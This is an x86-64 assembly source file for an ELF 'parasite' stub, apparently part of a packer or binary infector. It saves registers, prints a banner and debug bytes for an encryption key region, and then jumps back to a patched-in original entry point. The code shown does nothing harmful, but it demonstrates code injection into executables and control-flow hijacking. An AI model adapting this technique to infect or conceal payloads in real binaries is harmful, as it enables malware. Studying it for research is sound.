BITS 64

global _start


;-x-x-x-x- CONSTANTS -x-x-x-x-;
SYS_WRITE   equ 0x1         ; 1
KEY_ADDR    equ 0x10        ; 16
;-x-x-x-x- CONSTANTS -x-x-x-x-;



section .text
_start:
	; Save register state, RBX can be safely used
	push rax
	push rcx
	push rdx
	push rdi

	jmp	parasite
	message:	db	"-x-x-x-x- \_<O>_<O>_/ -x-x-x-x-", 0xa
	filepath:   db  "/proc/self/maps", 0x0
	newline:	db 	0xa
	debug:		db 	"another one" , 0xa
	encStart:	dq	0x1111111111111111

parasite:

	; Print our message
	; %rax      | %rdi | %rsi | %rdx
	; sys_write	|  fd  | *buf | count

	xor	rax, rax
	add	rax, SYS_WRITE
	mov rdi, rax
	lea rsi, [rel message]
	xor rdx, rdx
	mov dl, 0x20
	syscall

	push r13

	; r10 -> encryption start
	; r13 -> key start
	; r15 -> end encryption (key start)
	xor r13, r13
	lea r13, [rel _start - KEY_ADDR]
	mov r10, r13
	sub r10, [rel encStart]

	xor	rax, rax
	add	rax, SYS_WRITE
	mov rdi, rax
	mov rsi, r13
	xor rdx, rdx
	mov dl, 20
	syscall

	xor	rax, rax
	add	rax, SYS_WRITE
	mov rdi, rax
	lea rsi, [rel newline]
	xor rdx, rdx
	mov dl, 1
	syscall

	xor	rax, rax
	add	rax, SYS_WRITE
	mov rdi, rax
	mov rsi, r10
	xor rdx, rdx
	mov dl, 20
	syscall

	xor	rax, rax
	add	rax, SYS_WRITE
	mov rdi, rax
	lea rsi, [rel newline]
	xor rdx, rdx
	mov dl, 1
	syscall

	pop r13

;--------------------------------------------------------------------

ender:
	; Restoring register state
	pop rdi
	pop rdx
	pop rcx
	pop rax
	
	push r12

	xor r12, r12
	xor r10, r10
	mov r12, 0xAAAAAAAAAAAAAAAA ; get jump addr from patch
	lea r10, [rel _start - KEY_ADDR] ; get rel addr of end of text
	sub r10, r12 ; sub size of [entrypoint - _start] to _start addr

	pop r12

	jmp	r10
